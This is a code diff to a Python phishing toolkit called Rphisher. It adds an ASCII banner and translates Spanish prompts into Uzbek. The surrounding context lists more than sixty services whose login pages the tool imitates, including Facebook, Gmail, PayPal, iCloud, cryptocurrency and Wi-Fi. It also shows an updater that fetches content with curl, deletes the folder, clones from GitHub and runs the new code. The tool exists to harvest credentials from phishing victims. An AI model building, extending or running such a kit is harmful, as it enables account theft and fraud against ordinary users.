@@ -29,8 +29,15 @@ error = bblue + '[' + bwhite + '!' + bblue + '] '+bred
 info= byellow + '[' + bwhite + '+' + byellow + '] '+ bcyan
 info2= bgreen + '[' + bwhite + '•' + bgreen + '] '+ bpurple
 
-
-logo=f""""""
+print("\033[1;32m")
+logo=f"""  _____        _     _     _               
+ |  __ \      | |   (_)   | |              
+ | |__) |_ __ | |__  _ ___| |__   ___ _ __ 
+ |  _  /| '_ \| '_ \| / __| '_ \ / _ \ '__|
+ | | \ \| |_) | | | | \__ \ | | |  __/ |   
+ |_|  \_\ .__/|_| |_|_|___/_| |_|\___|_|   
+        | |                                
+        |_|                                \n\n"""
 
 sites=["Facebook Traditional", "Facebook Voting","Facebook Security", "Messenger", "Instagram Traditional", "Insta Auto Followers", "Insta 1000 Followers", "Insta Blue Verify", "Gmail Old", "Gmail New","Gmail Poll","Microsoft","Netflix","Paypal","Steam","Twitter","PlayStation","TikTok","Twitch","Pinterest","SnapChat", "LinkedIn","Ebay","Quora","Protonmail","Spotify","Reddit","Adobe","DevianArt","Badoo","Clash Of Clans","Ajio","JioRouter","FreeFire","Pubg","Telegram","Youtube","Airtel","SocialClub","Ola","Outlook","Amazon","Origin","DropBox","Yahoo","WordPress","Yandex","StackOverflow","VK","VK Poll","Xbox","Mediafire","Gitlab","Github","Apple","iCloud","Shopify","Myspace","Shopping","Cryptocurrency","SnapChat2","Verizon","Wi-Fi","Discord","Roblox","Custom"]
 
@@ -136,8 +143,8 @@ def update():
         system("clear")
         changelog=popen("curl -s -N https://raw.githubusercontent.com/RasulBekDevUz/Rphisher/main/files/changelog.log").read()
         print(logo)
-        print(f"{info}Rphisher tiene una actualizacion!\n{info2}Actual: {bred}{version}\n{info}Disponible: {bgreen}{git_ver}\n")
-        upask=input(ask+"Rphiserni yangilamoqchisiz (tavsiya etiladi) yangilash uchun [y] yoki bekor qilish uchun [n] tugmasini bosing -->"+bwhite)
+        print(f"{info}Rphisher yangilanish bor\n{info2}Actual: {bred}{version}\n{info}Mavjud {bgreen}{git_ver}\n")
+        upask=input(ask+"Rphisherni yangilamoqchisiz (tavsiya etiladi) yangilash uchun [y] yoki bekor qilish uchun [n] tugmasini bosing -->"+bwhite)
         if upask=="y":
             print(nc)
             system("cd .. && rm -rf Rphisher && git clone https://github.com/RasulBekDevUz/Rphisher.git && cd Rphisher && python3 Rphisher.py")
@@ -173,7 +180,7 @@ def internet(host="8.8.8.8", port=53, timeout=5):
         socket.setdefaulttimeout(timeout)
         socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
     except socket.error:
-        print(error+"Sin internet :c")
+        print(error+"Internetingizda momo bor ):")
         time.sleep(2)
         internet()
 
